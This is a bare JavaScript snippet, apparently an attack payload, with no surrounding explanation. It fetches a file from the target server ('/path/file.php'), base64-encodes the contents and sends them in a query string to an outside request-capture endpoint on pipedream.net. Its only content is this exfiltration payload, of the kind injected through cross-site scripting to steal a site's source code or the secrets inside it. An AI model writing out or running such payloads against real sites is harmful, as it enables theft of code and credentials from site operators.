fetch('/path/file.php')
  .then(res => res.text())
  .then(data => fetch('https://eoow6y96ffo9mzx.m.pipedream.net/?code=' + btoa(data)));
